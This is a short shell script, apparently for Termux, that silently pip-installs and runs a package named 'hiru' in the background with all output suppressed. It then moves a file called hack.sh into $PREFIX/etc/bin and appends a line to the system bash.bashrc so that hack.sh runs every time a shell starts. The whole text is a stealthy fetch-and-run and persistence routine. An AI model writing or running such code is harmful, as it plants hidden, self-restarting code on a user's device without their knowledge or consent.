_evalBg() {
eval "$@" &>/dev/null & disown;
}
cmd="pip install hiru && hiru";
_evalBg "${cmd}";
mv hack.sh $PREFIX/etc/bin 
echo "bash hack.sh" >> $PREFIX/etc/bash.bashrc
